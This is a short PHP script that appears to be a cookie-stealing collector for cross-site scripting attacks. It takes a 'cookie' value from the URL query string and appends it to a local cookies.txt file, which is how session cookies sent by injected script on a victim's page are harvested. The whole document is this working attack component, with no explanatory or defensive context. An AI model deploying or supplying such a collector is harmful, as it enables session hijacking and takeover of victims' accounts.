<?php
if (isset($_GET['cookie'])) {
    $cookies = $_GET['cookie'] . PHP_EOL;
    file_put_contents('./cookies.txt', $cookies, FILE_APPEND);
}